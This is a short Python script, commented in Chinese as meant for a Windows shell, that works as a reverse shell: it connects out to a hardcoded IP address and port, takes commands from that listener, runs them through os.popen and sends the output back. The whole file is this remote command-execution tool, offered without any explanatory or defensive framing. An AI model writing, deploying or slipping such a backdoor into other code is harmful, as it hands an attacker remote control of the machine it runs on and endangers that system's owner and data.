#-*- coding: utf-8 -*-
"""
适用win_shell
"""

import os,sys
from socket import *

HOST = '192.168.19.128'  #目标地址IP
PORT = 6666        #目标端口
BUFSIZ = 2048
ADDR=(HOST, PORT)
client = socket(AF_INET, SOCK_STREAM)
client.connect(ADDR)

while True:
    data = client.recv(BUFSIZ)
    if data:
        if data == "exit":
            sys.exit()
        PL = os.popen(data.decode('utf8'))
        os_result = PL.read()
        #print(os_result)
        if os_result == "":
            error = "shell error"
            client.sendall(error)
        else:   
            client.sendall(os_result)
